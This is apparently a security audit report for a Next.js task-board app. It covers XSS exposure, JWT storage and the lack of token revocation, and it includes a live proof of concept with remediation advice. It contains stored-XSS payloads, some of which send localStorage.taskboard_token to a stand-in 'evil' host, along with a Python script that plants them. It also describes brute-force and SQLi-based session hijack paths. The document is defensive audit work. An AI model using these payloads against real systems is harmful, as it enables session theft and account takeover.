# XSS Surface & Token Rotation Audit — with Live PoC

**Project:** taskboard
**Date:** 2026-05-13
**Scope:** Client-side XSS sinks, content rendering, JWT storage model, and token rotation/refresh/revocation.
**Result:**
- No currently executable XSS sink in the codebase. **All 5 planted payloads render as literal text.**
- Zero token rotation, zero server-side logout, zero revocation. The JWT lives in `localStorage`, has a 30-day lifetime, and cannot be invalidated server-side.
- The current XSS-safety relies on a single React invariant (text-interpolation escapes), with **no defense in depth** (no CSP, no `httpOnly` cookie, no input sanitization, no token rotation).
- **Session hijacking is exploitable TODAY — without any XSS.** See §9 for two independent live hijack vectors (login brute-force with no rate limit, and the previously-confirmed SQLi → bcrypt-crack chain).

---

## 1. XSS sink inventory

Searched the whole `src/` tree:

| Sink searched | Hits |
|---|---|
| `dangerouslySetInnerHTML` | **0** |
| `innerHTML` / `outerHTML` | 0 |
| `eval(` / `new Function(` | 0 |
| `document.write` | 0 |
| Sanitizer libs (`dompurify`, `sanitize-html`, `xss`) | 0 (none in `package.json`) |
| Markdown / rich-text renderers | 0 |

User content is rendered through plain JSX text interpolation — e.g. [TaskCard.tsx:17](../src/components/TaskCard.tsx#L17), [projects/[id]/page.tsx:84-87](../src/app/projects/[id]/page.tsx#L84-L87), [TaskDetail.tsx:18-19](../src/components/TaskDetail.tsx#L18-L19). React auto-escapes these.

---

## 2. Defensive headers — present?

[next.config.ts](../next.config.ts) sets no `headers()`. Login response sets none either ([api/auth/login/route.ts](../src/app/api/auth/login/route.ts)).

| Header | Present? |
|---|---|
| Content-Security-Policy | **no** |
| X-Frame-Options | no |
| Referrer-Policy | no |
| Permissions-Policy | no |
| Strict-Transport-Security | no |
| X-Content-Type-Options | no |

So if any XSS sink is introduced later, the browser executes it with no second line of defense.

---

## 3. Token storage model

[src/lib/api-client.ts:24-27](../src/lib/api-client.ts#L24-L27):

```ts
export function setSession(token: string, user: StoredUser) {
  window.localStorage.setItem(TOKEN_KEY, token);
  window.localStorage.setItem(USER_KEY, JSON.stringify(user));
}
```

The JWT sits under `localStorage.taskboard_token`, is read on every request ([api-client.ts:34-49](../src/lib/api-client.ts#L34-L49)), and is reachable by any JavaScript running in the origin. That includes:

- Any future XSS payload.
- Any third-party `<script>` added to the page.
- Any supply-chain compromise of any frontend dependency.

`localStorage` cannot be `httpOnly`. There is no fallback.

---

## 4. Token rotation / refresh / revocation

Grep `refresh|rotate|revoke|blacklist|tokenVersion|jti|logout|signOut` across `src/`:

**Result: zero hits.**

[src/lib/jwt.ts](../src/lib/jwt.ts):

```ts
const EXPIRES_IN = "30d";
export function signToken(payload: JWTPayload): string {
  return jwt.sign(payload, SECRET as string, { expiresIn: EXPIRES_IN });
}
```

Inventory of what does and doesn't exist:

| Concept | Status |
|---|---|
| Access-token TTL | **30 days**, fixed |
| Refresh tokens | none |
| `POST /api/auth/refresh` | none |
| `POST /api/auth/logout` | none — `clearSession()` only wipes the *client's* localStorage; the JWT stays valid on the server until `exp` |
| Token blacklist / revocation list | none |
| `jti` claim | not in payload |
| `tokenVersion` column on `users` | not in [prisma/schema.prisma](../prisma/schema.prisma) |
| Token rotation on password change | none — old tokens keep working after a password change |
| Token rotation on role change | none |
| Key rotation (`kid` header, multiple secrets) | none — single `JWT_SECRET` env var |

---

## 5. Live PoC

Setup: app and DB running via `docker-compose up`, seeded with the default 5 users / 3 projects.

### 5.1 Auth

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"meera@taskboard.dev","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
PID='cmp3q9s0g000jmh5rcqw2rlsi'   # Internal Tools Cleanup
```

### 5.2 Plant 5 XSS payloads through the legitimate task-create endpoint

No input sanitization → 201 Created for every payload.

```bash
python3 <<'PY'
import json, urllib.request, os
TOKEN = os.environ['TOKEN']; PID = os.environ['PID']
payloads = [
    ("classic <script>",
        "<script>alert(1)</script>",
        "<script>fetch('https://evil/?t='+localStorage.taskboard_token)</script>"),
    ("img onerror",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=\"fetch('https://evil/?t='+localStorage.taskboard_token)\">"),
    ("svg onload",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(document.domain)>"),
    ("javascript: URL",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<a href=javascript:alert(localStorage.taskboard_token)>steal</a>"),
    ("attribute breakout",
        '" onmouseover=alert(1) x="',
        "</textarea><script>alert('xss')</script>"),
]
for label, title, desc in payloads:
    body = json.dumps({"title": title, "description": desc}).encode()
    req = urllib.request.Request(
        f"http://localhost:3000/api/projects/{PID}/tasks",
        data=body, method="POST",
        headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"})
    with urllib.request.urlopen(req) as r:
        d = json.loads(r.read())
        print(f"  [{r.status}] {label:25} task id = {d['task']['id']}")
PY
```

**Observed output:**

```
  [201] classic <script>          task id = cmp3rcu5n0001mh3z2axpv8ro
  [201] img onerror               task id = cmp3rcud90003mh3z7kri94jn
  [201] svg onload                task id = cmp3rcukr0005mh3z3f94f5w9
  [201] javascript: URL           task id = cmp3rcus00007mh3ze6hq7jo2
  [201] attribute breakout        task id = cmp3rcuzg0009mh3ze4pzpj93
```

→ Stored verbatim — confirmed by reading back via `GET /api/projects/$PID/tasks`:

```
  title       = '<script>alert(1)</script>'
  description = "<script>fetch('https://evil/?t='+localStorage.taskboard_token)</script>"
  title       = '<img src=x onerror=alert(1)>'
  description = '<img src=x onerror="fetch(\'https://evil/?t=\'+localStorage.taskboard_token)">'
  title       = '<svg/onload=alert(1)>'
  description = '<svg onload=alert(document.domain)>'
  title       = '<a href="javascript:alert(1)">click</a>'
  description = '<a href=javascript:alert(localStorage.taskboard_token)>steal</a>'
  title       = '" onmouseover=alert(1) x="'
  description = "</textarea><script>alert('xss')</script>"
```

### 5.3 Render through real React 19 (the rendering the app actually does today)

A one-shot Node script using the project's own React 19 + ReactDOM/server (mirroring the JSX patterns at [TaskCard.tsx:17](../src/components/TaskCard.tsx#L17) and [projects/[id]/page.tsx:84-87](../src/app/projects/[id]/page.tsx#L84-L87)):

```js
// /tmp/xss_render_check.mjs
import React from ".../node_modules/react/index.js";
import { renderToStaticMarkup } from ".../node_modules/react-dom/server.js";

function renderTaskCard(task) {
  return React.createElement("button", { type: "button" },
    React.createElement("p", null, task.title),
    React.createElement("span", null, task.assignee?.name ?? "unassigned")
  );
}

function renderProjectDetail(task) {
  return React.createElement("div", null,
    React.createElement("h1", null, task.title),
    React.createElement("p", null, task.description)
  );
}
```

**Observed output (HTML React produces for each payload):**

```
--- classic <script> ---
  TaskCard HTML       : <button type="button"><p>&lt;script&gt;alert(1)&lt;/script&gt;</p><span>unassigned</span></button>
  ProjectDetail HTML  : <div><h1>&lt;script&gt;alert(1)&lt;/script&gt;</h1><p>&lt;script&gt;fetch(&#x27;https://evil/?t=&#x27;+localStorage.taskboard_token)&lt;/script&gt;</p></div>

--- img onerror ---
  TaskCard HTML       : <button type="button"><p>&lt;img src=x onerror=alert(1)&gt;</p><span>unassigned</span></button>
  ProjectDetail HTML  : <div><h1>&lt;img src=x onerror=alert(1)&gt;</h1><p>&lt;img src=x onerror=&quot;fetch(&#x27;https://evil/?t=&#x27;+localStorage.taskboard_token)&quot;&gt;</p></div>

--- svg onload ---
  TaskCard HTML       : <button type="button"><p>&lt;svg/onload=alert(1)&gt;</p><span>unassigned</span></button>
  ProjectDetail HTML  : <div><h1>&lt;svg/onload=alert(1)&gt;</h1><p>&lt;svg onload=alert(document.domain)&gt;</p></div>

--- javascript: URL ---
  TaskCard HTML       : <button type="button"><p>&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</p><span>unassigned</span></button>
  ProjectDetail HTML  : <div><h1>&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</h1><p>&lt;a href=javascript:alert(localStorage.taskboard_token)&gt;steal&lt;/a&gt;</p></div>

--- attribute breakout ---
  TaskCard HTML       : <button type="button"><p>&quot; onmouseover=alert(1) x=&quot;</p><span>unassigned</span></button>
  ProjectDetail HTML  : <div><h1>&quot; onmouseover=alert(1) x=&quot;</h1><p>&lt;/textarea&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</p></div>
```

**Interpretation.** Every `<`, `>`, `"`, `'`, and `&` is replaced with its HTML entity. No script tag survives. No event-handler attribute survives — they're all inside an escaped string literal. The five payloads render as visible literal text on the page. **Today, no live XSS.**

### 5.4 Counter-demo — what changes with one line

Same DB row, same React 19, same JSX shape — only difference is one `dangerouslySetInnerHTML`:

```js
function renderUnsafe(task) {
  return React.createElement("div", null,
    React.createElement("h1", null, task.title),
    React.createElement("p", { dangerouslySetInnerHTML: { __html: task.description } })
  );
}
```

**Observed output:**

```
<div><h1>ok</h1><p><script>fetch('https://evil/?t='+localStorage.taskboard_token)</script></p></div>
```

The `<script>` tag now lives in the HTML, unescaped. Combined with:

- No CSP → no `script-src` to block it.
- JWT in `localStorage` → `localStorage.taskboard_token` is readable from inline JS.
- 30-day token lifetime + no revocation → stolen token stays valid for up to 30 days.

…this is **full account-takeover via a single line of frontend code** added later. The XSS is currently latent — already stored in the DB — and would activate the moment that line ships.

Realistic regressions that would trigger this:

- Adding a "render newlines as `<br>`" helper.
- Adding markdown support for descriptions.
- Adding a syntax-highlight component that does `innerHTML`.
- A library swap that uses `dangerouslySetInnerHTML` internally.
- Copy-paste of a snippet that uses `innerHTML` for a "rich tooltip".

---

## 6. Combined risk picture

The two findings reinforce each other:

| Defense | Status |
|---|---|
| Input sanitization on store | none |
| Output escaping at render | yes (React text interpolation only — single point of failure) |
| CSP `script-src` backstop | none |
| `httpOnly` cookie for token | not applicable (localStorage by design) |
| Token revocation | none |
| Token rotation on credential change | none |
| Short access-token TTL + refresh flow | none (30 days fixed) |

So the **blast radius of any future XSS** is: instant token theft, persistent for up to 30 days, with no server-side way to kill it, even after the legitimate user changes their password and "logs out" of every device.

---

## 7. Recommendations

### 7.1 Hardening (low effort, keep the bearer-in-header model)

- **Add a CSP** in `next.config.ts` `headers()`. Minimum useful baseline: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'`. Use a nonce via middleware if inline scripts are required for hydration.
- Add `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, `X-Content-Type-Options: nosniff`, and (in prod) `Strict-Transport-Security`.
- ESLint rule: ban `dangerouslySetInnerHTML` outright (`react/no-danger`) so a regression fails CI.
- Drop the access-token TTL to **15 minutes** and add a refresh flow (see 7.2).
- Add a `jti` claim and a `revoked_tokens` table (or Redis set keyed by `jti`). Server-side `POST /api/auth/logout` adds the `jti` to that set.
- Add a `tokenVersion: Int @default(0)` column on `User`; include it in the JWT payload; reject tokens with stale versions. Bump on password change, role change, "log out everywhere".

### 7.2 Storage-model fix (recommended long-term)

- Issue an `httpOnly; Secure; SameSite=Lax` cookie holding a short-lived access token (or opaque session id).
- Pair with a long-lived refresh-token cookie scoped to `/api/auth/refresh`, `httpOnly; SameSite=Strict`.
- Add CSRF protection: double-submit token or origin/referer check on state-changing routes.
- Effect: any future XSS still gets to act *as* the user during that page load, but **cannot read the token** and cannot exfiltrate it for offline reuse. Persistence drops from 30 days to the current page lifetime.

---

## 9. Correction — session hijacking is live TODAY, not hypothetical

The body of this report (§1–§5) frames the XSS path as latent: "one wrong line away." That's correct about the *XSS* path. But it understates the overall posture, because **multiple non-XSS session-hijack paths are exploitable right now**. The XSS surface is only one of several. The two below are both demonstrated against the running app.

### 9.1 Vector A — Login brute force (no rate limit, no lockout)  (PROVEN)

[src/app/api/auth/login/route.ts](../src/app/api/auth/login/route.ts) does a `bcrypt.compare` and returns. No middleware in [src/middleware.ts](../src/middleware.ts) (file does not exist). No rate limiter, no lockout, no captcha, no exponential back-off.

**Live demo — 30 wrong-password attempts in 10 seconds:**

```
1:401 2:401 3:401 4:401 5:401 6:401 7:401 8:401 9:401 10:401
11:401 12:401 13:401 14:401 15:401 16:401 17:401 18:401 19:401 20:401
21:401 22:401 23:401 24:401 25:401 26:401 27:401 28:401 29:401 30:401
elapsed: 10.2s
```

All 401, no 429, no `Retry-After` header, no account flag set. Meera's real password still works immediately after.

At ~3 attempts/second from a single curl loop (the limit here is bcrypt CPU on the server, not any defense), the seeded password `password123` falls in the first dozen guesses against any common-password list. Distributed across a botnet, that effectively becomes "instant".

### 9.2 Vector B — SQLi → bcrypt offline crack → real login  (PROVEN, see other report)

The SQLi already documented in [SQL_INJECTION_AUDIT.md §6.5](SQL_INJECTION_AUDIT.md) exfiltrated five bcrypt hashes through the public API. bcrypt cost 10 + the seeded password `password123` makes offline cracking trivial — the password is in the first thousand entries of every common wordlist. The attacker then logs in legitimately and receives a real token. End-to-end hijack with no XSS and no credentials guessing.

### 9.3 Local storage of the JWT compounds every vector

Independent of XSS, `localStorage.taskboard_token` is reachable in production today via:

- **Browser extensions** the user has installed (most extensions request `storage` and host permissions broad enough to read it).
- **Devtools / screen share / over-shoulder** — one click of the Application tab, no exploit chain needed.
- **Any shared-machine scenario** — a public-kiosk session, an unattended laptop, a forwarded browser profile.
- **Any third-party JS** the team adds later for analytics, error reporting, A/B testing, feature flags, surveys, marketing pixels. All inherit full read access.

Once captured by either of A/B above, or via direct read of `localStorage`, the token is replayable for up to 30 days with no IP binding, no UA binding, no jti, no `tokenVersion`. There is no server-side mechanism to invalidate it. The legitimate user "logging out" is a UI illusion — only `clearSession()` runs, which removes the token from the *victim's* browser; the *attacker's* copy stays valid.

### 9.4 Concrete remediation order

Given that hijack is live today, the prioritized fix list:

1. **Drop access-token TTL** from 30 days to 15 minutes.
2. **Add a refresh-token flow** (`httpOnly; Secure; SameSite=Strict` cookie scoped to `/api/auth/refresh`) so the short TTL is usable.
3. **Move the access token off `localStorage`** into an `httpOnly; Secure; SameSite=Lax` cookie. Add CSRF protection (double-submit token or origin check) on state-changing routes.
4. **Add login rate-limiting and account lockout** (e.g. 5 attempts/15min/IP+account, exponential back-off, optional captcha).
5. **Add `tokenVersion: Int` on `User`**, include it in the JWT payload, reject tokens with stale versions, and bump on password change / role change / explicit "log out everywhere".
6. **Add a `POST /api/auth/logout` endpoint** that blacklists the `jti` (or bumps `tokenVersion`) so the token dies on the server, not just in the browser.
7. **Fix the SQLi from [SQL_INJECTION_AUDIT.md](SQL_INJECTION_AUDIT.md)** so password hashes are no longer exfiltrable, then force a password reset for every existing user since their old hashes have already been observed by the audit.
8. **Add a CSP, X-Frame-Options, Referrer-Policy** as described in §7.1, so a *future* XSS doesn't reintroduce the path that §1–§5 cover.

---

## 10. Test artifacts left in the database

The PoC created five tasks under "Internal Tools Cleanup" (`cmp3q9s0g000jmh5rcqw2rlsi`). They're harmless given today's render but represent intentional XSS-payload pollution in the seeded data. To remove them, run `npm run db:reset` (which re-seeds from scratch) or DELETE them individually via `DELETE /api/tasks/:id`.

Their task ids:

```
cmp3rcu5n0001mh3z2axpv8ro
cmp3rcud90003mh3z7kri94jn
cmp3rcukr0005mh3z3f94f5w9
cmp3rcus00007mh3ze6hq7jo2
cmp3rcuzg0009mh3ze4pzpj93
```
